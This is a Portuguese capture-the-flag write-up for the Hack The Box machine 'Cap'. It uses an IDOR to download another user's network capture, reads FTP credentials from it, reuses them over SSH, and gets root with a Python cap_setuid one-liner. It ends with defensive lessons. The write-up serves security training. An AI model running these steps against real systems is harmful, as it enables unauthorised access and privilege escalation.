# Cap — Hack The Box

| | |
|---|---|
| **Máquina** | Cap |
| **SO** | Linux |
| **Dificuldade** | Easy |
| **Tópicos** | IDOR (download de PCAP) · credenciais em tráfego · Linux capabilities (`cap_setuid`) |

---

## Resumo

Um dashboard de segurança gera capturas de rede, mas um **IDOR** permite baixar o PCAP de **outra sessão** — que contém **credenciais FTP em texto claro**. As credenciais são reutilizadas no SSH. O root vem de uma **capability** mal configurada no binário do Python.

---

## 1. Reconhecimento

```bash
nmap -sC -sV -oA nmap/cap 10.10.10.X
```

- **21** — FTP
- **22** — SSH
- **80** — HTTP (Security Dashboard em Gunicorn)

---

## 2. Foothold — IDOR → credenciais no PCAP

O app guarda capturas em `http://10.10.10.X/data/<id>`. Trocando o `id` para um valor baixo (ex.: **`/data/0`**) você baixa o PCAP de **outro usuário**:

```bash
# baixa a captura de outra sessão
curl http://10.10.10.X/data/0 -o 0.pcap
```

Abrindo no Wireshark e seguindo o fluxo TCP do **FTP**, as credenciais do usuário **`nathan`** aparecem em **texto claro** (FTP não é cifrado).

```bash
ssh nathan@10.10.10.X      # senha recuperada do PCAP
cat user.txt
```

---

## 3. Escalação de privilégio — Linux capability

```bash
getcap -r / 2>/dev/null
# /usr/bin/python3.8 = cap_setuid+ep
```

Com `cap_setuid`, o Python pode assumir UID 0 sem ser SUID tradicional:

```bash
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
id        # uid=0(root)
cat /root/root.txt
```

---

## Lições aprendidas

- **IDOR** (controle de acesso quebrado por objeto) expõe dados de outros usuários — validar autorização em **cada objeto**, não só no login.
- Protocolos **em texto claro** (FTP) vazam credencial no tráfego → usar FTPS/SFTP.
- **Capabilities** do Linux mal atribuídas (`cap_setuid` no Python) = root direto.

### Perspectiva Blue Team / detecção

- Monitorar acesso a recursos sequenciais/IDs fora do padrão do usuário (sinal de IDOR/enumeração).
- Alertar uso de **FTP em claro** e credenciais trafegando sem TLS.
- Auditar capabilities periodicamente (`getcap -r /`) e remover as desnecessárias.
